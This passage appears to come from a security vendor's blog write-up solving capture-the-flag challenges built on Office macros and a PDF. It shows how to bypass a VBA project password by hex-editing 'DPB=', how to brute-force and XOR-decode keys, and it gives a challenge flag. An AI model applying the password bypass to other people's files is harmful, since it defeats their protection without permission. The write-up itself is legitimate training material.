<p><a href="https://blog.paloaltonetworks.com/wp-content/uploads/2016/08/Untitled3-1.png"><img class="aligncenter size-large wp-image-17293" src="https://blog.paloaltonetworks.com/wp-content/uploads/2016/08/Untitled3-1-500x345.png" alt="Untitled3" width="500" height="345" srcset="https://blog.paloaltonetworks.com/wp-content/uploads/2016/08/Untitled3-1-500x345.png 500w, https://blog.paloaltonetworks.com/wp-content/uploads/2016/08/Untitled3-1-230x159.png 230w, https://blog.paloaltonetworks.com/wp-content/uploads/2016/08/Untitled3-1-435x300.png 435w, https://blog.paloaltonetworks.com/wp-content/uploads/2016/08/Untitled3-1-58x40.png 58w, https://blog.paloaltonetworks.com/wp-content/uploads/2016/08/Untitled3-1.png 525w" sizes="(max-width: 500px) 100vw, 500px" /></a></p>
<p>Typing in the wrong key displays a message “U can do. Try harder…” accompanied by a sweet picture of doge.</p>
<p><a href="https://blog.paloaltonetworks.com/wp-content/uploads/2016/08/Untitled4-1.png"><img class="aligncenter size-large wp-image-17296" src="https://blog.paloaltonetworks.com/wp-content/uploads/2016/08/Untitled4-1-500x505.png" alt="Untitled4" width="500" height="505" srcset="https://blog.paloaltonetworks.com/wp-content/uploads/2016/08/Untitled4-1-500x505.png 500w, https://blog.paloaltonetworks.com/wp-content/uploads/2016/08/Untitled4-1-100x100.png 100w, https://blog.paloaltonetworks.com/wp-content/uploads/2016/08/Untitled4-1-230x232.png 230w, https://blog.paloaltonetworks.com/wp-content/uploads/2016/08/Untitled4-1-297x300.png 297w, https://blog.paloaltonetworks.com/wp-content/uploads/2016/08/Untitled4-1-40x40.png 40w, https://blog.paloaltonetworks.com/wp-content/uploads/2016/08/Untitled4-1-32x32.png 32w, https://blog.paloaltonetworks.com/wp-content/uploads/2016/08/Untitled4-1-64x64.png 64w, https://blog.paloaltonetworks.com/wp-content/uploads/2016/08/Untitled4-1-96x96.png 96w, https://blog.paloaltonetworks.com/wp-content/uploads/2016/08/Untitled4-1-128x128.png 128w, https://blog.paloaltonetworks.com/wp-content/uploads/2016/08/Untitled4-1.png 686w" sizes="(max-width: 500px) 100vw, 500px" /></a></p>
<p>If we attempt to look at the underlying macros, we can see that the VBProject is password protected.</p>
<p><a href="https://blog.paloaltonetworks.com/wp-content/uploads/2016/08/Untitled4-2.png"><img class="aligncenter size-full wp-image-17299" src="https://blog.paloaltonetworks.com/wp-content/uploads/2016/08/Untitled4-2.png" alt="Untitled4" width="487" height="236" srcset="https://blog.paloaltonetworks.com/wp-content/uploads/2016/08/Untitled4-2.png 487w, https://blog.paloaltonetworks.com/wp-content/uploads/2016/08/Untitled4-2-230x111.png 230w, https://blog.paloaltonetworks.com/wp-content/uploads/2016/08/Untitled4-2-83x40.png 83w" sizes="(max-width: 487px) 100vw, 487px" /></a></p>
<p>To circumvent this, we’ll simply load the document up in our favorite hex editor and modify the string ‘DPB=”’ to ‘DPX=”’.</p>
<p><a href="https://blog.paloaltonetworks.com/wp-content/uploads/2016/08/Untitled5-1.png"><img class="aligncenter size-large wp-image-17302" src="https://blog.paloaltonetworks.com/wp-content/uploads/2016/08/Untitled5-1-500x81.png" alt="Untitled5" width="500" height="81" srcset="https://blog.paloaltonetworks.com/wp-content/uploads/2016/08/Untitled5-1-500x81.png 500w, https://blog.paloaltonetworks.com/wp-content/uploads/2016/08/Untitled5-1-230x37.png 230w, https://blog.paloaltonetworks.com/wp-content/uploads/2016/08/Untitled5-1-510x83.png 510w, https://blog.paloaltonetworks.com/wp-content/uploads/2016/08/Untitled5-1-240x40.png 240w, https://blog.paloaltonetworks.com/wp-content/uploads/2016/08/Untitled5-1.png 731w" sizes="(max-width: 500px) 100vw, 500px" /></a></p>
<p>We’ve now corrupted the document so that when we re-open the file and it parses this string, it will find it to be an invalid key. However, it still allows us to load the project, thus bypassing the protection ‘DPB’ provided.</p>
<p><a href="https://blog.paloaltonetworks.com/wp-content/uploads/2016/08/Untitled6-1.png"><img class="aligncenter size-large wp-image-17305" src="https://blog.paloaltonetworks.com/wp-content/uploads/2016/08/Untitled6-1-500x212.png" alt="Untitled6" width="500" height="212" srcset="https://blog.paloaltonetworks.com/wp-content/uploads/2016/08/Untitled6-1-500x212.png 500w, https://blog.paloaltonetworks.com/wp-content/uploads/2016/08/Untitled6-1-230x97.png 230w, https://blog.paloaltonetworks.com/wp-content/uploads/2016/08/Untitled6-1-510x216.png 510w, https://blog.paloaltonetworks.com/wp-content/uploads/2016/08/Untitled6-1-94x40.png 94w, https://blog.paloaltonetworks.com/wp-content/uploads/2016/08/Untitled6-1.png 637w" sizes="(max-width: 500px) 100vw, 500px" /></a></p>
<p>Once inside the project, you can go into the ‘Project Properties’ and uncheck ‘Lock project for viewing’ under the ‘Protection’ tab to remove the password permanently.</p>
<p>Looking at the code, we have a form called ‘UserForm1’ and a module called ‘NewMacros’. If we right click on the form and go to ‘View Code’, we see the underlying macro we’re interested in and immediately see a byte-array for the key.</p>
<p><a href="https://blog.paloaltonetworks.com/wp-content/uploads/2016/08/Untitled7-1.png"><img class="aligncenter size-large wp-image-17308" src="https://blog.paloaltonetworks.com/wp-content/uploads/2016/08/Untitled7-1-500x57.png" alt="Untitled7" width="500" height="57" srcset="https://blog.paloaltonetworks.com/wp-content/uploads/2016/08/Untitled7-1-500x57.png 500w, https://blog.paloaltonetworks.com/wp-content/uploads/2016/08/Untitled7-1-230x26.png 230w, https://blog.paloaltonetworks.com/wp-content/uploads/2016/08/Untitled7-1-768x87.png 768w, https://blog.paloaltonetworks.com/wp-content/uploads/2016/08/Untitled7-1-510x58.png 510w, https://blog.paloaltonetworks.com/wp-content/uploads/2016/08/Untitled7-1-240x27.png 240w, https://blog.paloaltonetworks.com/wp-content/uploads/2016/08/Untitled7-1.png 900w" sizes="(max-width: 500px) 100vw, 500px" /></a></p>
<p>We can see that if X equals the string of bytes, then we get our win message. The value X is derived from the ‘suchcrypto’ function being passed our input and the IV ‘General Vidal’. The function doesn’t look particularly difficult to reverse.</p>
<p><a href="https://blog.paloaltonetworks.com/wp-content/uploads/2016/08/Untitled8-1.png"><img class="aligncenter size-large wp-image-17311" src="https://blog.paloaltonetworks.com/wp-content/uploads/2016/08/Untitled8-1-500x358.png" alt="Untitled8" width="500" height="358" srcset="https://blog.paloaltonetworks.com/wp-content/uploads/2016/08/Untitled8-1-500x358.png 500w, https://blog.paloaltonetworks.com/wp-content/uploads/2016/08/Untitled8-1-230x165.png 230w, https://blog.paloaltonetworks.com/wp-content/uploads/2016/08/Untitled8-1-768x550.png 768w, https://blog.paloaltonetworks.com/wp-content/uploads/2016/08/Untitled8-1-419x300.png 419w, https://blog.paloaltonetworks.com/wp-content/uploads/2016/08/Untitled8-1-56x40.png 56w, https://blog.paloaltonetworks.com/wp-content/uploads/2016/08/Untitled8-1.png 900w" sizes="(max-width: 500px) 100vw, 500px" /></a></p>
<p>But I opted to take an even lazier route to beat this challenge. I decided to fight macro with macro. By creating an array of potential values and passing each of them to the ‘suchcrypto’ function, I am able to easily enumerate what the key is and when I find a matching value, move on to the next.</p>
<p>By using the full array and Notepad++, I record a small macro of hitting the up arrow a few times and deleting the last byte, before copying and pasting the result then doing it again. What I’m left with is a long list of ‘For’ loops that I can copy into the ‘UserForm()’ macro.</p>
<p>Starting with:</p>
<p><a href="https://blog.paloaltonetworks.com/wp-content/uploads/2016/08/Untitled9-1.png"><img class="aligncenter size-large wp-image-17314" src="https://blog.paloaltonetworks.com/wp-content/uploads/2016/08/Untitled9-1-500x170.png" alt="Untitled9" width="500" height="170" srcset="https://blog.paloaltonetworks.com/wp-content/uploads/2016/08/Untitled9-1-500x170.png 500w, https://blog.paloaltonetworks.com/wp-content/uploads/2016/08/Untitled9-1-230x78.png 230w, https://blog.paloaltonetworks.com/wp-content/uploads/2016/08/Untitled9-1-768x261.png 768w, https://blog.paloaltonetworks.com/wp-content/uploads/2016/08/Untitled9-1-510x174.png 510w, https://blog.paloaltonetworks.com/wp-content/uploads/2016/08/Untitled9-1-118x40.png 118w, https://blog.paloaltonetworks.com/wp-content/uploads/2016/08/Untitled9-1.png 899w" sizes="(max-width: 500px) 100vw, 500px" /></a></p>
<p>Ending with:</p>
<p><a href="https://blog.paloaltonetworks.com/wp-content/uploads/2016/08/Untitled10.png"><img class="aligncenter size-large wp-image-17317" src="https://blog.paloaltonetworks.com/wp-content/uploads/2016/08/Untitled10-500x115.png" alt="Untitled10" width="500" height="115" srcset="https://blog.paloaltonetworks.com/wp-content/uploads/2016/08/Untitled10-500x115.png 500w, https://blog.paloaltonetworks.com/wp-content/uploads/2016/08/Untitled10-230x53.png 230w, https://blog.paloaltonetworks.com/wp-content/uploads/2016/08/Untitled10-768x177.png 768w, https://blog.paloaltonetworks.com/wp-content/uploads/2016/08/Untitled10-510x118.png 510w, https://blog.paloaltonetworks.com/wp-content/uploads/2016/08/Untitled10-174x40.png 174w, https://blog.paloaltonetworks.com/wp-content/uploads/2016/08/Untitled10.png 898w" sizes="(max-width: 500px) 100vw, 500px" /></a></p>
<p>Now we just hit enter a few times and watch the key unwind itself for us!</p>
<p><a href="https://blog.paloaltonetworks.com/wp-content/uploads/2016/08/Untitled11.png"><img class="aligncenter size-full wp-image-17320" src="https://blog.paloaltonetworks.com/wp-content/uploads/2016/08/Untitled11.png" alt="Untitled11" width="412" height="523" srcset="https://blog.paloaltonetworks.com/wp-content/uploads/2016/08/Untitled11.png 412w, https://blog.paloaltonetworks.com/wp-content/uploads/2016/08/Untitled11-230x292.png 230w, https://blog.paloaltonetworks.com/wp-content/uploads/2016/08/Untitled11-236x300.png 236w, https://blog.paloaltonetworks.com/wp-content/uploads/2016/08/Untitled11-32x40.png 32w" sizes="(max-width: 412px) 100vw, 412px" /></a></p>
<p><a href="https://blog.paloaltonetworks.com/wp-content/uploads/2016/08/Untitled12.png"><br />
</a><a href="https://blog.paloaltonetworks.com/wp-content/uploads/2016/08/Untitled12.png"><img class="aligncenter size-full wp-image-17326" src="https://blog.paloaltonetworks.com/wp-content/uploads/2016/08/Untitled12.png" alt="Untitled12" width="358" height="469" srcset="https://blog.paloaltonetworks.com/wp-content/uploads/2016/08/Untitled12.png 358w, https://blog.paloaltonetworks.com/wp-content/uploads/2016/08/Untitled12-230x301.png 230w, https://blog.paloaltonetworks.com/wp-content/uploads/2016/08/Untitled12-229x300.png 229w, https://blog.paloaltonetworks.com/wp-content/uploads/2016/08/Untitled12-31x40.png 31w" sizes="(max-width: 358px) 100vw, 358px" /></a></p>
<p><strong><a href="https://blog.paloaltonetworks.com/wp-content/uploads/2016/08/Untitled12.png"><br />
</a>PAN{L4$t_Night_@f@iry_Vizited_M3}</strong></p>
<h3>Document 3 Challenge: Adobe, pls</h3>
<p><em>Challenge Created By: Curtis Carmony </em><a href="https://twitter.com/c1fe" target="_blank"><em>@c1fe</em></a></p>
<p>I started out debugging the extracted javascript. I was feeling pretty clever when I found the decoded YouTube URL until Rick Astley started singing that he was never going to give me up. Nice Rick Roll Curtis! I hope it got some of you out there as well.</p>
<p><a href="https://blog.paloaltonetworks.com/wp-content/uploads/2016/08/Untitled13.png"><img class="aligncenter size-large wp-image-17329" src="https://blog.paloaltonetworks.com/wp-content/uploads/2016/08/Untitled13-500x284.png" alt="Untitled13" width="500" height="284" srcset="https://blog.paloaltonetworks.com/wp-content/uploads/2016/08/Untitled13-500x284.png 500w, https://blog.paloaltonetworks.com/wp-content/uploads/2016/08/Untitled13-230x130.png 230w, https://blog.paloaltonetworks.com/wp-content/uploads/2016/08/Untitled13-768x436.png 768w, https://blog.paloaltonetworks.com/wp-content/uploads/2016/08/Untitled13-510x289.png 510w, https://blog.paloaltonetworks.com/wp-content/uploads/2016/08/Untitled13-71x40.png 71w, https://blog.paloaltonetworks.com/wp-content/uploads/2016/08/Untitled13.png 975w" sizes="(max-width: 500px) 100vw, 500px" /></a></p>
<p>Next, I went through the different streams in Cerbero profiler and saw the JS tag with hex in the first object.</p>
<p><a href="https://blog.paloaltonetworks.com/wp-content/uploads/2016/08/Untitled14.png"><img class="aligncenter size-large wp-image-17332" src="https://blog.paloaltonetworks.com/wp-content/uploads/2016/08/Untitled14-500x173.png" alt="Untitled14" width="500" height="173" srcset="https://blog.paloaltonetworks.com/wp-content/uploads/2016/08/Untitled14-500x173.png 500w, https://blog.paloaltonetworks.com/wp-content/uploads/2016/08/Untitled14-230x79.png 230w, https://blog.paloaltonetworks.com/wp-content/uploads/2016/08/Untitled14-768x265.png 768w, https://blog.paloaltonetworks.com/wp-content/uploads/2016/08/Untitled14-510x176.png 510w, https://blog.paloaltonetworks.com/wp-content/uploads/2016/08/Untitled14-116x40.png 116w, https://blog.paloaltonetworks.com/wp-content/uploads/2016/08/Untitled14.png 975w" sizes="(max-width: 500px) 100vw, 500px" /></a></p>
<p>I put that into a hex editor and then tested the key to complete the challenge.</p>
<p><a href="https://blog.paloaltonetworks.com/wp-content/uploads/2016/08/Untitled15.png"><img class="aligncenter size-large wp-image-17335" src="https://blog.paloaltonetworks.com/wp-content/uploads/2016/08/Untitled15-500x163.png" alt="Untitled15" width="500" height="163" srcset="https://blog.paloaltonetworks.com/wp-content/uploads/2016/08/Untitled15-500x163.png 500w, https://blog.paloaltonetworks.com/wp-content/uploads/2016/08/Untitled15-230x75.png 230w, https://blog.paloaltonetworks.com/wp-content/uploads/2016/08/Untitled15-768x250.png 768w, https://blog.paloaltonetworks.com/wp-content/uploads/2016/08/Untitled15-510x166.png 510w, https://blog.paloaltonetworks.com/wp-content/uploads/2016/08/Untitled15-123x40.png 123w, https://blog.paloaltonetworks.com/wp-content/uploads/2016/08/Untitled15.png 975w" sizes="(max-width: 500px) 100vw, 500px" /></a></p>
<p><a href="https://blog.paloaltonetworks.com/wp-content/uploads/2016/08/Untitled16.png"><img class="aligncenter size-large wp-image-17338" src="https://blog.paloaltonetworks.com/wp-content/uploads/2016/08/Untitled16-500x276.png" alt="Untitled16" width="500" height="276" srcset="https://blog.paloaltonetworks.com/wp-content/uploads/2016/08/Untitled16-500x276.png 500w, https://blog.paloaltonetworks.com/wp-content/uploads/2016/08/Untitled16-230x127.png 230w, https://blog.paloaltonetworks.com/wp-content/uploads/2016/08/Untitled16-768x423.png 768w, https://blog.paloaltonetworks.com/wp-content/uploads/2016/08/Untitled16-510x281.png 510w, https://blog.paloaltonetworks.com/wp-content/uploads/2016/08/Untitled16-73x40.png 73w, https://blog.paloaltonetworks.com/wp-content/uploads/2016/08/Untitled16.png 778w" sizes="(max-width: 500px) 100vw, 500px" /></a></p>
<h3>Document 4 Challenge: Macros are fun.</h3>
<p><em>Challenge Created By: Curtis Carmony </em><a href="https://twitter.com/c1fe" target="_blank"><em>@c1fe</em></a></p>
<p>For this challenge, we’re provided a file “fun.docm”, with the extension implying that we’ll be having (no)fun with macros!</p>
<p>After opening the document, we’re presented with the text “MORE MACROS = MORE FUN” in large color-changing font with a lovely air-horn sound that plays on repeat. Attempting to open the VB Project reveals that it’s password protected, so we’ll need to bypass this first.</p>
<p><a href="https://blog.paloaltonetworks.com/wp-content/uploads/2016/08/Untitled17.png"><img class="aligncenter size-full wp-image-17341" src="https://blog.paloaltonetworks.com/wp-content/uploads/2016/08/Untitled17.png" alt="Untitled17" width="412" height="179" srcset="https://blog.paloaltonetworks.com/wp-content/uploads/2016/08/Untitled17.png 412w, https://blog.paloaltonetworks.com/wp-content/uploads/2016/08/Untitled17-230x100.png 230w, https://blog.paloaltonetworks.com/wp-content/uploads/2016/08/Untitled17-92x40.png 92w" sizes="(max-width: 412px) 100vw, 412px" /></a></p>
<p>As the new format for Doc files are archives, we’ll open it up in 7z and look for the ‘vbaProject.bin’ file under the ‘\word\’ directory. Open this up in a hex editor and search for the string ‘DPB=”’ then simply change it to something like ‘DPX=”’ and save the file. When you load the file now you’ll receive an error about the project containing an invalid key with an option to continue loading it anyway. Now you’ll be able to access the VB Project and can go into the Project Properties and unselect ‘Lock project for viewing’ to remove the password protection.</p>
<p><a href="https://blog.paloaltonetworks.com/wp-content/uploads/2016/08/Untitled18.png"><img class="aligncenter size-full wp-image-17344" src="https://blog.paloaltonetworks.com/wp-content/uploads/2016/08/Untitled18.png" alt="Untitled18" width="300" height="115" srcset="https://blog.paloaltonetworks.com/wp-content/uploads/2016/08/Untitled18.png 300w, https://blog.paloaltonetworks.com/wp-content/uploads/2016/08/Untitled18-230x88.png 230w, https://blog.paloaltonetworks.com/wp-content/uploads/2016/08/Untitled18-104x40.png 104w" sizes="(max-width: 300px) 100vw, 300px" /></a></p>
<p>Looking at the project, we can see that there are two forms, ‘NpuXrzgq’ and ‘U8pblvDZuAh8Gy’, along with one module ‘Z1yiWeP’. Looking at the code in the main document and the module, it looks like there are a lot of functions so we’ll start by debugging it and get a feel for what it’s trying to do. Putting a ‘Stop’ after the initial ‘Document_Open()’ function starts the process.</p>
<p><a href="https://blog.paloaltonetworks.com/wp-content/uploads/2016/08/Untitled19.png"><img class="aligncenter size-large wp-image-17347" src="https://blog.paloaltonetworks.com/wp-content/uploads/2016/08/Untitled19-500x257.png" alt="Untitled19" width="500" height="257" srcset="https://blog.paloaltonetworks.com/wp-content/uploads/2016/08/Untitled19-500x257.png 500w, https://blog.paloaltonetworks.com/wp-content/uploads/2016/08/Untitled19-230x118.png 230w, https://blog.paloaltonetworks.com/wp-content/uploads/2016/08/Untitled19-510x262.png 510w, https://blog.paloaltonetworks.com/wp-content/uploads/2016/08/Untitled19-78x40.png 78w, https://blog.paloaltonetworks.com/wp-content/uploads/2016/08/Untitled19.png 750w" sizes="(max-width: 500px) 100vw, 500px" /></a></p>
<p>Before even getting into the meat of the macro we can see we may have a problem as it’s checking if there are four ‘VBcomponents’ when we only have three. Stepping through the ‘zkceuV405Q5LjUp587OYxTI7OR9zTyPdvz8k’ function, we find this to be the series of events that decode the embedded WAV file and continuously play the air-horn while changing the text in the document.</p>
<p>If we adjust the code so it doesn’t fail the first check, we follow the macro to ‘XiqyXdC809pP5esSrC633ag92w0x6otQylY0’ function, which immediately calls ‘zoycqKJvqznJMeMpHe7Z61xYJfLLmbObxBVy’ and then begins to enumerate the function names.</p>
<p><a href="https://blog.paloaltonetworks.com/wp-content/uploads/2016/08/Untitled20.png"><img class="aligncenter size-large wp-image-17350" src="https://blog.paloaltonetworks.com/wp-content/uploads/2016/08/Untitled20-500x264.png" alt="Untitled20" width="500" height="264" srcset="https://blog.paloaltonetworks.com/wp-content/uploads/2016/08/Untitled20-500x264.png 500w, https://blog.paloaltonetworks.com/wp-content/uploads/2016/08/Untitled20-230x122.png 230w, https://blog.paloaltonetworks.com/wp-content/uploads/2016/08/Untitled20-768x406.png 768w, https://blog.paloaltonetworks.com/wp-content/uploads/2016/08/Untitled20-510x270.png 510w, https://blog.paloaltonetworks.com/wp-content/uploads/2016/08/Untitled20-76x40.png 76w, https://blog.paloaltonetworks.com/wp-content/uploads/2016/08/Untitled20.png 900w" sizes="(max-width: 500px) 100vw, 500px" /></a></p>
<p>The function ‘BqNFmKCS7cTPv9XNFOd2mCLrdqCfmdNm6HBz’ begins a process of base-64 decoding the function name and then modifying the byte-values based on various fields of the document.</p>
<p><a href="https://blog.paloaltonetworks.com/wp-content/uploads/2016/08/Untitled21.png"><img class="aligncenter size-large wp-image-17353" src="https://blog.paloaltonetworks.com/wp-content/uploads/2016/08/Untitled21-500x78.png" alt="Untitled21" width="500" height="78" srcset="https://blog.paloaltonetworks.com/wp-content/uploads/2016/08/Untitled21-500x78.png 500w, https://blog.paloaltonetworks.com/wp-content/uploads/2016/08/Untitled21-230x36.png 230w, https://blog.paloaltonetworks.com/wp-content/uploads/2016/08/Untitled21-768x120.png 768w, https://blog.paloaltonetworks.com/wp-content/uploads/2016/08/Untitled21-510x80.png 510w, https://blog.paloaltonetworks.com/wp-content/uploads/2016/08/Untitled21-240x38.png 240w, https://blog.paloaltonetworks.com/wp-content/uploads/2016/08/Untitled21.png 900w" sizes="(max-width: 500px) 100vw, 500px" /></a></p>
<p>Both of the functions are one-byte XoR’s, 44 and 32 respectively, which then get compared to the base-64 decoded value of ‘U8pblvDZuAh8GY.Label1.Caption’, which is ‘xRgWTqWr7ipEjFBfESrOiaYFu9i9Jml3Q171’.</p>
<p><a href="https://blog.paloaltonetworks.com/wp-content/uploads/2016/08/Untitled21.png"><img class="aligncenter size-large wp-image-17356" src="https://blog.paloaltonetworks.com/wp-content/uploads/2016/08/Untitled21-500x127.png" alt="Untitled21" width="500" height="127" srcset="https://blog.paloaltonetworks.com/wp-content/uploads/2016/08/Untitled21-500x127.png 500w, https://blog.paloaltonetworks.com/wp-content/uploads/2016/08/Untitled21-230x58.png 230w, https://blog.paloaltonetworks.com/wp-content/uploads/2016/08/Untitled21-768x195.png 768w, https://blog.paloaltonetworks.com/wp-content/uploads/2016/08/Untitled21-510x129.png 510w, https://blog.paloaltonetworks.com/wp-content/uploads/2016/08/Untitled21-158x40.png 158w, https://blog.paloaltonetworks.com/wp-content/uploads/2016/08/Untitled21.png 899w" sizes="(max-width: 500px) 100vw, 500px" /></a></p>
<p>Based on this, we can grab all of the function names and quickly determine the match by base64 decoding each and XoR’ing the bytes by 44 and 32.</p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-5f694c5aa65a3666428079" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
&gt;&gt;&gt; a = base64.b64decode("yRQaQqmn4iZIgFxTHSbChaoJt9SxKmV7T1L5")
&gt;&gt;&gt; b = base64.b64decode("xRgWTqWr7ipEjFBfESrOiaYFu9i9Jml3Q171")
&gt;&gt;&gt; b
'\xc5\x18\x16N\xa5\xab\xee*D\x8cP_\x11*\xce\x89\xa6\x05\xbb\xd8\xbd&amp;iwC^\xf5'
&gt;&gt;&gt; c = ""
&gt;&gt;&gt; for i in a:
...     c += chr(ord(i) ^ 44 ^ 32)
...
&gt;&gt;&gt; c
'\xc5\x18\x16N\xa5\xab\xee*D\x8cP_\x11*\xce\x89\xa6\x05\xbb\xd8\xbd&amp;iwC^\xf5'</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-5f694c5aa65a3666428079-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f694c5aa65a3666428079-2">2</div><div class="crayon-num" data-line="crayon-5f694c5aa65a3666428079-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f694c5aa65a3666428079-4">4</div><div class="crayon-num" data-line="crayon-5f694c5aa65a3666428079-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f694c5aa65a3666428079-6">6</div><div class="crayon-num" data-line="crayon-5f694c5aa65a3666428079-7">7</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f694c5aa65a3666428079-8">8</div><div class="crayon-num" data-line="crayon-5f694c5aa65a3666428079-9">9</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f694c5aa65a3666428079-10">10</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-5f694c5aa65a3666428079-1"><span class="crayon-o">&gt;&gt;&gt;</span><span class="crayon-h"> </span><span class="crayon-v">a</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-v">base64</span><span class="crayon-sy">.</span><span class="crayon-e">b64decode</span><span class="crayon-sy">(</span><span class="crayon-s">"yRQaQqmn4iZIgFxTHSbChaoJt9SxKmV7T1L5"</span><span class="crayon-sy">)</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f694c5aa65a3666428079-2"><span class="crayon-o">&gt;&gt;&gt;</span><span class="crayon-h"> </span><span class="crayon-v">b</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-v">base64</span><span class="crayon-sy">.</span><span class="crayon-e">b64decode</span><span class="crayon-sy">(</span><span class="crayon-s">"xRgWTqWr7ipEjFBfESrOiaYFu9i9Jml3Q171"</span><span class="crayon-sy">)</span></div><div class="crayon-line" id="crayon-5f694c5aa65a3666428079-3"><span class="crayon-o">&gt;&gt;&gt;</span><span class="crayon-h"> </span><span class="crayon-i">b</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f694c5aa65a3666428079-4"><span class="crayon-s">'\xc5\x18\x16N\xa5\xab\xee*D\x8cP_\x11*\xce\x89\xa6\x05\xbb\xd8\xbd&amp;iwC^\xf5'</span></div><div class="crayon-line" id="crayon-5f694c5aa65a3666428079-5"><span class="crayon-o">&gt;&gt;&gt;</span><span class="crayon-h"> </span><span class="crayon-v">c</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-s">""</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f694c5aa65a3666428079-6"><span class="crayon-o">&gt;&gt;&gt;</span><span class="crayon-h"> </span><span class="crayon-st">for</span><span class="crayon-h"> </span><span class="crayon-i">i</span><span class="crayon-h"> </span><span class="crayon-st">in</span><span class="crayon-h"> </span><span class="crayon-v">a</span><span class="crayon-o">:</span></div><div class="crayon-line" id="crayon-5f694c5aa65a3666428079-7"><span class="crayon-sy">.</span><span class="crayon-sy">.</span><span class="crayon-sy">.</span><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-v">c</span><span class="crayon-h"> </span><span class="crayon-o">+=</span><span class="crayon-h"> </span><span class="crayon-e">chr</span><span class="crayon-sy">(</span><span class="crayon-e">ord</span><span class="crayon-sy">(</span><span class="crayon-v">i</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-o">^</span><span class="crayon-h"> </span><span class="crayon-cn">44</span><span class="crayon-h"> </span><span class="crayon-o">^</span><span class="crayon-h"> </span><span class="crayon-cn">32</span><span class="crayon-sy">)</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f694c5aa65a3666428079-8"><span class="crayon-sy">.</span><span class="crayon-sy">.</span><span class="crayon-sy">.</span></div><div class="crayon-line" id="crayon-5f694c5aa65a3666428079-9"><span class="crayon-o">&gt;&gt;&gt;</span><span class="crayon-h"> </span><span class="crayon-i">c</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f694c5aa65a3666428079-10"><span class="crayon-s">'\xc5\x18\x16N\xa5\xab\xee*D\x8cP_\x11*\xce\x89\xa6\x05\xbb\xd8\xbd&amp;iwC^\xf5'</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0005 seconds] -->
<p>Now that we have our interesting function name, we can force the macro to use this value and continue debugging it.</p>
<p>Back in the ‘XiqyXdC809pP5esSrC633ag92w0x6otQylY0’ function, it will take another function name, ‘d7KRoSK5UEDh35jJNkj0TtcJjOIbmBZlyCql’ and pass it along with our matching name to another function, which base64 decodes ‘d7KRoSK5UEDh35jJNkj0TtcJjOIbmBZlyCql’ into an array before sending us to function ‘XWn5TNdoykQb0QoitVEG7sLOxIRSi97XmqmM’ which has a ‘MsgBox’ call, presumably to print our flag!</p>
<p>Looking at the function we can see there are a few more XoR and comparison checks against property values for the forms within the VBProject.</p>
<p><a href="https://blog.paloaltonetworks.com/wp-content/uploads/2016/08/Untitled22.png"><img class="aligncenter size-large wp-image-17359" src="https://blog.paloaltonetworks.com/wp-content/uploads/2016/08/Untitled22-500x78.png" alt="Untitled22" width="500" height="78" srcset="https://blog.paloaltonetworks.com/wp-content/uploads/2016/08/Untitled22-500x78.png 500w, https://blog.paloaltonetworks.com/wp-content/uploads/2016/08/Untitled22-230x36.png 230w, https://blog.paloaltonetworks.com/wp-content/uploads/2016/08/Untitled22-768x120.png 768w, https://blog.paloaltonetworks.com/wp-content/uploads/2016/08/Untitled22-510x80.png 510w, https://blog.paloaltonetworks.com/wp-content/uploads/2016/08/Untitled22-240x38.png 240w, https://blog.paloaltonetworks.com/wp-content/uploads/2016/08/Untitled22.png 900w" sizes="(max-width: 500px) 100vw, 500px" /></a></p>
